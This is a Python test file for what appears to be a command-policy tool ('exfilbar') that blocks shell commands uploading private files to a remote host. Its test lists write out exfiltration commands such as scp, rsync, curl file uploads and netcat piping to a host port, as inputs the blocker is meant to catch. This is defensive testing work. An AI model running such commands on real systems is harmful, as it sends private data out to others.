import unittest
from exfilbar.parse import parse
from exfilbar.policy import Policy

class ParseTests(unittest.TestCase):
    def test_upload_families(self):
        for command in ['scp private/a host:inbox', 'scp -P 2222 -i identity -o Check=yes "private/data export.csv" host:inbox', 'rsync -e "ssh -p 22" private/a host:inbox', 'rsync --port=873 private/a rsync://host/module', 'curl -F report=@private/a https://host/upload', 'curl --form report=@private/a https://host/upload', 'curl -Tprivate/a https://host/upload', 'curl --upload-file=private/a https://host/upload', 'nc host 9000 < private/a', 'netcat -w 3 host 9000 < private/a', 'cat "private/data export.csv" | nc host 9000', 'git push origin main']:
            with self.subTest(command=command):
                self.assertTrue(Policy(block_git_push=True).evaluate(command).blocked)
    def test_direction_and_flags(self):
        for command in ['cp private/a local', 'scp host:private/a local', 'rsync host:private/a local', 'scp private/a local', 'curl -f -D private/headers https://host/file', 'curl --form-string report=@private/a https://host/upload', 'curl -H "X-Label: @private/a" https://host/file', 'git pull origin main', 'python script.py']:
            with self.subTest(command=command):
                self.assertFalse(Policy().evaluate(command).blocked)
    def test_unresolved(self):
        for command in ['scp $FILE host:inbox', 'scp $(find private) host:inbox', 'scp -r public host:inbox', 'rsync -a public host:inbox', 'curl -T - https://host/upload', 'scp public/ host:inbox', 'sudo scp public.csv host:inbox', 'bash -c "scp public.csv host:inbox"', 'scp "unfinished', 'cat a b | nc host 9', 'nc host 9 << EOF', 'scp --mystery public.csv host:inbox']:
            with self.subTest(command=command):
                self.assertTrue(Policy().evaluate(command).blocked)
    def test_quoted_source(self):
        transfer = parse('scp "public/data export.csv" host:inbox')[0]
        self.assertEqual(transfer.sources, ('public/data export.csv',))
        self.assertFalse(transfer.unresolved)
    def test_chains(self):
        for separator in [' && ', '\n', '; ']:
            self.assertTrue(Policy().evaluate('echo ok' + separator + 'scp private/a host:inbox').blocked)

    def test_unsupported_shell_syntax(self):
        for command in ['scp public.csv host:inbox > log', 'env MODE=x scp public.csv host:inbox', 'MODE=x scp public.csv host:inbox', 'curl -F report=$FILE https://host/upload', 'nc host 9 <', 'scp public.csv $HOST:inbox']:
            with self.subTest(command=command):
                self.assertTrue(Policy().evaluate(command).blocked)

    def test_directory_changes_are_unresolved(self):
        result = Policy().evaluate('cd private && scp a host:inbox')
        self.assertTrue(result.blocked)
        self.assertEqual(result.reason, 'unresolved source')
